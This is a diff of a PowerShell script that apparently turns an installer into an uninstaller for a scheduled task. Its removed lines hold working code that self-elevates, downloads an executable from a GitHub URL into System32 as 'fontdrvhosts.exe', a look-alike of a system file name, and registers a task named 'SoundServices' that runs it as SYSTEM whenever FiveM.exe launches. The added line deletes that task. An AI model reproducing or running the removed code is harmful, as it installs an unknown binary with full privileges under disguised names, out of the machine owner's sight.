@@ -1,33 +1,6 @@
-
-
 if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
-    Write-Host "ADMIN..."
- 
     Start-Process -FilePath "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
     exit
 }
  
- 
-$system32Path = "$env:windir\System32"
-$exeDestination = Join-Path $system32Path "fontdrvhosts.exe"
-$databasePath = Join-Path $system32Path "database.txt"
- 
- 
-$exeUrl = "https://raw.githubusercontent.com/n0roffbrain/xgproject/main/td6u938.exe"
- 
- 
-Invoke-WebRequest -Uri $exeUrl -OutFile $exeDestination
- 
-$key = Read-Host "Enter License Key"
- 
-Set-Content -Path $databasePath -Value $key
- 
- 
-$cmd = 'cmd /c schtasks /create /tn "SoundServices" /tr "C:\Windows\System32\fontdrvhosts.exe" /sc ONEVENT /ec Security /mo "*[System[(EventID=4688)]] and *[EventData[Data[@Name=''NewProcessName'']=''%localappdata%\FiveM\FiveM.exe'']]" /ru SYSTEM'
- 
- 
-Invoke-Expression $cmd
- 
- 
-
-auditpol /set /subcategory:"Process Creation" /success:enable
+cmd /c schtasks /delete /tn "SoundServices" /f
